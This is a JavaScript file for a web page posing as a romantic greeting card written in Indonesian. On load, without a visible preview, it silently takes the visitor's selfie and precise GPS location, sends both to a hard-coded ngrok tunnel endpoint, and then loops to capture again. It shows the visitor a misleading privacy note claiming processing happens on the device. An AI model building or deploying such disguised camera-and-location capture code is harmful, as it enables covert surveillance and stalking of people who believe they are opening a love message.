

/* ============ CONFIG ============ */
const UCAPAN_TITLE = "Untuk Cintaku 💖";
const UCAPAN_LINES = [
  "Selamat hari spesial, sayang.",
  "Semoga senyummu selalu jadi cahaya di hari-hariku.",
  "Di mana pun kamu hari ini, aku selalu memikirkanmu."
];
// Ganti ini dengan URL server Python Anda jika berbeda dari yang ada di Canvas (server_processor.py)
const BACKEND_URL = 'https://5126ff3f775f.ngrok-free.app/api/capture'; 
/* =================================*/

const startBtn = document.getElementById('startBtn');
const resetBtn = document.getElementById('resetBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const cardMsg = document.getElementById('cardMsg');
const msgTitle = document.getElementById('msgTitle');
const msgSub = document.getElementById('msgSub');
const coordsText = document.getElementById('coordsText');
const flash = document.getElementById('flash');
const stage = document.getElementById('stage');
const postActions = document.getElementById('postActions');
const shareBtn = document.getElementById('shareBtn');
const downloadBtn = document.getElementById('downloadBtn');
const copyBtn = document.getElementById('copyBtn');
const note = document.getElementById('note');

    const loadingModal = document.getElementById('loadingModal');
    const loadingStatus = document.getElementById('loadingStatus');
// Modal Elements
const customModal = document.getElementById('customModal');
const modalTitle = document.getElementById('modalTitle');
const modalBody = document.getElementById('modalBody');
const modalCloseBtn = document.getElementById('modalCloseBtn');

    const showLoading = (statusMessage) => {
        loadingStatus.textContent = statusMessage || "Meminta Izin & Lokasi...";
        loadingModal.classList.remove('hidden');
        startBtn.disabled = true;
        startBtn.textContent = 'Mulai...';
    };

    const hideLoading = () => {
        loadingModal.classList.add('hidden');
        startBtn.disabled = false;
        startBtn.textContent = 'Mulai Capture & Kirim';
    };

    const showAlert = (title, message) => {
        modalTitle.textContent = title;
        modalBody.textContent = message;
        customModal.classList.remove('hidden');
    };

    modalCloseBtn.onclick = () => {
        customModal.classList.add('hidden');
        resetFlow();
    };
    
modalCloseBtn.addEventListener('click', () => { 
  customModal.classList.add('hidden'); 
});

function showDialog(title, body) {
  modalTitle.textContent = title;
  modalBody.textContent = body;
  customModal.classList.remove('hidden');
}

let stream = null;
let lastBlobUrl = null;
let lastBlob = null;
let lastCoords = null;

function setMessage() {
  msgTitle.textContent = UCAPAN_TITLE;
  msgSub.innerHTML = `<span class="typewriter">${UCAPAN_LINES.join(' ')}</span>`;
}

  /* helper: get geolocation */
  function getLocation(timeout = 10000) {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) return reject(new Error('Geolocation tidak didukung'));
      const opts = { enableHighAccuracy: true, timeout, maximumAge: 0 };
      navigator.geolocation.getCurrentPosition(
        pos => resolve(pos.coords),
        err => reject(err),
        opts
      );
    });
  }
/* helper: start camera */
async function startCamera(){
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) throw new Error('Camera API tidak tersedia');
  // Pastikan menggunakan 'user' facing mode untuk selfie
  stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
  video.srcObject = stream;
  await new Promise(r => video.onloadedmetadata = r);
  video.play().catch(()=>{});
  // video.classList.add('video-blur'); <--- Dihapus karena preview tidak ditampilkan
}

/* helper: capture photo from video -> returns blob */
function capturePhotoBlob(){
  // Mengambil dimensi video, walau tidak ditampilkan
  const w = video.videoWidth || 640; 
  const h = video.videoHeight || 480;
  canvas.width = w; 
  canvas.height = h;
  const ctx = canvas.getContext('2d');
  
  // Flip back to normal for photo (mirror correction)
  ctx.save();
  ctx.translate(w, 0);
  ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0, w, h);
  ctx.restore();

  // Overlay subtle vignette
  ctx.fillStyle = 'rgba(0,0,0,0.12)';
  ctx.fillRect(0, h * 0.75, w, h * 0.25); 
  
  // Convert to blob
  return new Promise(resolve => canvas.toBlob(blob => resolve(blob), 'image/jpeg', 0.92));
}

/* helper: converts Blob to Base64 String */
function blobToBase64(blob) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();
    reader.onloadend = () => {
      // Extract only the base64 data part (remove the 'data:image/jpeg;base64,' prefix)
      const base64Data = reader.result.split(',')[1];
      resolve(base64Data);
    };
    reader.onerror = reject;
    reader.readAsDataURL(blob);
  });
}

/* function to send data to Python backend */
async function sendToBackend(blob, coords) {
  note.textContent = 'Mengirim data (foto & lokasi) ke backend Python... Mohon tunggu.';
  
  // Implementasi exponential backoff untuk mencoba kembali koneksi
  const maxRetries = 3;
  const initialDelay = 1000;
  
  for (let attempt = 0; attempt < maxRetries; attempt++) {
    try {
      const base64Image = await blobToBase64(blob);

      const payload = {
        image_base64: base64Image,
        timestamp: new Date().toISOString(),
        location: coords ? {
          latitude: coords.latitude,
          longitude: coords.longitude,
          accuracy: coords.accuracy
        } : null,
        message: UCAPAN_TITLE + ' - ' + UCAPAN_LINES.join(' ')
      };

      const response = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      if (response.ok) {
        const result = await response.json();
        console.log('Backend Success:', result);
        note.textContent = `✅ Data berhasil diterima Backend (${result.id || 'N/A'}). Sekarang memicu Share.`;
        return true;
      } 
      
      // If not OK, but not the last attempt, try again after delay
      if (attempt < maxRetries - 1) {
        const delay = initialDelay * Math.pow(2, attempt);
        await new Promise(res => setTimeout(res, delay));
        continue; // Jump to next iteration/attempt
      }

      // If last attempt failed
      const errorData = await response.json().catch(() => ({ message: 'Error jaringan atau server.' }));
      throw new Error(`Backend Error: ${response.status} - ${errorData.message || 'Gagal memproses data.'}`);
    
    } catch (error) {
      if (attempt < maxRetries - 1) {
        const delay = initialDelay * Math.pow(2, attempt);
        console.warn(`Attempt ${attempt + 1} failed, retrying in ${delay / 1000}s...`);
        await new Promise(res => setTimeout(res, delay));
        continue;
      }
      console.error('Gagal mengirim ke backend setelah semua retry:', error);
      showDialog('Gagal Kirim ke Server', `Data foto/lokasi gagal dikirim ke endpoint ${BACKEND_URL} setelah ${maxRetries} kali coba. Pastikan server Python berjalan. Error: ${error.message}`);
      note.textContent = '❌ Gagal mengirim data ke backend. Silakan coba lagi.';
      return false;
    }
  }
  return false; // Should not be reached, but fallback
}


/* stop camera */

/**
 * Resets the UI and state for a new capture without reloading the page.
 */
function softReset() {
  if (lastBlobUrl) { URL.revokeObjectURL(lastBlobUrl); lastBlobUrl = null; lastBlob = null; }
  lastCoords = null;
  cardMsg.classList.add('hidden');
  postActions.style.display = 'none';
  startBtn.disabled = false;
  startBtn.textContent = 'Mulai Capture & Kirim';
  startBtn.style.display = 'inline-block';
  resetBtn.style.display = 'none';
  stage.classList.add('hidden'); 
  note.textContent = 'Privasi: foto & lokasi diproses di perangkat lalu dikirim ke *backend* Python di /api/capture.';
}

/* show cinematic animation and overlay message */
function showCinematic(coords){
  // show flash
  flash.classList.remove('hidden');
  // set message
  setMessage();
  // Karena stage tersembunyi, pesan akan muncul di tengah layar, bukan di atas video.
  cardMsg.classList.remove('hidden');
  coordsText.textContent = coords 
    ? `Lokasi: Lat ${coords.latitude.toFixed(6)}, Lon ${coords.longitude.toFixed(6)}` 
    : 'Lokasi tidak didapatkan.';
  
  // Hide flash after animation
  flash.addEventListener('animationend', ()=>{ flash.classList.add('hidden'); }, { once: true });
}

/* try to auto-open Web Share if supported */
async function tryAutoShare(blob){
  const textLines = UCAPAN_LINES.join(' ');
  // Correct Google Maps URL format: use maps.google.com/?q= for universal linking
  const mapLink = lastCoords ? `https://maps.google.com/?q=${lastCoords.latitude},${lastCoords.longitude}` : '';
  const shareText = `${UCAPAN_TITLE}\n\n${textLines}\n\n${ mapLink ? `Lokasi: ${mapLink}` : 'Lokasi tidak tersedia.' }\n\n(Ini kejutan manis untukmu 💖)`;
  
  const file = new File([blob], 'kejutan-romantis.jpg', { type: blob.type });

  note.textContent = '❗ Berbagi Otomatis gagal/dibatalkan. Silakan gunakan tombol di bawah untuk kirim manual.';
  return false;
}

/* FUNGSI BARU: Ambil foto, kirim, dan pemicu share TANPA COUNTDOWN */
async function captureAndSendFlow(){
  // Cukup jeda sebentar untuk memastikan stream video siap
  await new Promise(r => setTimeout(r, 500)); 

  // flash effect + capture
  flash.classList.remove('hidden');
  await new Promise(r => setTimeout(r, 220));
  const blob = await capturePhotoBlob();
  lastBlob = blob;
  if (lastBlobUrl) URL.revokeObjectURL(lastBlobUrl);
  lastBlobUrl = URL.createObjectURL(blob);

  // stop camera to save battery & privac
 

  // show cinematic overlay and message

  // Kirim data ke backend
  const backendSuccess = await sendToBackend(blob, lastCoords);

  // Pemicu Web Share otomatis
  await tryAutoShare(blob);
  
  // --- Auto Live Restart (tanpa reload) setelah sukses kirim backend ---
  if (backendSuccess) {
    // Jeda 3 detik agar pengguna sempat melihat pesan sukses sebelum me-restart
    note.textContent = '✅ Sukses! Data telah terkirim. Aplikasi akan memulai siklus baru secara otomatis dalam 3 detik (tanpa memuat ulang halaman).';
    await new Promise(r => setTimeout(r, 3000)); 
    softReset(); 
    
    // Mulai siklus capture/kirim berikutnya
    await runCaptureFlow();
  } else {
    // Jika gagal, tampilkan tombol Ulangi agar pengguna bisa mencoba lagi secara manual.
    startBtn.style.display = 'none';
  }
}

/* main flow: after user clicks start or auto-run is triggered */
async function runCaptureFlow() {
  startBtn.disabled = true;
  startBtn.textContent = 'Memproses...';
  // stage.classList.remove('hidden'); <--- BARIS INI DIHILANGKAN
  // NOTE diperbarui untuk mencerminkan permintaan izin segera
  note.textContent = 'Tunggu sebentar — browser akan meminta izin kamera & lokasi, lalu mengambil foto otomatis di latar belakang.';

  try {
    // 1. request camera (memicu permintaan izin jika belum granted)
    await startCamera();
    
    // 2. request location (memicu permintaan izin jika belum granted)
    let coords = null;
    try {
      coords = await getLocation(9000);
      lastCoords = coords;
    } catch (e) {
      console.warn('Lokasi gagal atau ditolak:', e);
      lastCoords = null;
      showDialog('Peringatan Lokasi', 'Gagal mendapatkan lokasi GPS. Foto akan dikirim tanpa koordinat.');
    }

    // 3. capture, send, and auto-restart
    await captureAndSendFlow();

  } catch (err) {
    console.error(err);
    showDialog('Gagal Akses', 'Gagal mengakses kamera. Pastikan izin diberikan dan device mendukungnya. Error: ' + err.message);
    startBtn.disabled = false;
    note.textContent = 'Privasi: foto & lokasi diproses di perangkat lalu dikirim ke *backend* Python di /api/capture.';
   
    
  }
}

// manual trigger
startBtn.addEventListener('click', runCaptureFlow);

// auto-run segera setelah halaman dimuat untuk meminta izin jika diperlukan
window.addEventListener('load', async () => {
  // Set initial note content and ensure stage is hidden at load
  note.textContent = 'Memuat... ';
  stage.classList.add('hidden');
  
  // Langsung panggil alur capture, yang akan meminta izin jika belum diberikan.
  runCaptureFlow();
});

/* post-action handlers */
shareBtn.addEventListener('click', async () => {
  if (!lastBlob) return showDialog('Gagal', 'Foto belum tersedia. Mulai ulang.');
  shareBtn.textContent = 'Mencoba berbagi...';
  try {
    await tryAutoShare(lastBlob);
  } catch(e){
    showDialog('Gagal Berbagi', 'Gagal membuka dialog berbagi: ' + (e.message||e));
  } finally {
    shareBtn.textContent = 'Berbagi Ulang';
  }
});

downloadBtn.addEventListener('click', () => {
  if (!lastBlobUrl) return showDialog('Gagal', 'Foto belum tersedia.');
  const a = document.createElement('a');
  a.href = lastBlobUrl;
  a.download = 'kejutan-romantis.jpg';
  document.body.appendChild(a);
  a.click();
  a.remove();
  note.textContent = 'Foto telah diunduh.';
});

copyBtn.addEventListener('click', async () => {
  const textLines = UCAPAN_LINES.join(' ');
  const mapLink = lastCoords ? `https://maps.google.com/?q=${lastCoords.latitude},${lastCoords.longitude}` : '';
  const shareText = `${UCAPAN_TITLE}\n\n${textLines}\n\n${ mapLink ? `Lokasi: ${mapLink}` : 'Lokasi tidak tersedia.' }\n\n(Ini kejutan manis untukmu 💖)`;
  try {
    // Using the legacy execCommand fallback is safer in sandbox environments
    if (!navigator.clipboard || window.isSecureContext === false) {
      const tempTextArea = document.createElement('textarea');
      tempTextArea.value = shareText;
      document.body.appendChild(tempTextArea);
      tempTextArea.select();
      document.execCommand('copy');
      tempTextArea.remove();
      showDialog('Sukses', 'Pesan telah disalin ke clipboard menggunakan fallback.');
    } else {
      await navigator.clipboard.writeText(shareText);
      showDialog('Sukses', 'Pesan telah disalin ke clipboard.');
    }
  } catch(e){
    console.error("Copy failed:", e);
    prompt('Gagal menyalin otomatis. Silakan salin tulisan di bawah ini (Ctrl/Cmd+C):', shareText);
  }
});

/* reset flow to allow retry */
resetBtn.addEventListener('click', softReset);

/* cleanup when leaving */
window.addEventListener('pagehide', () => {

  if (lastBlobUrl) URL.revokeObjectURL(lastBlobUrl);
});
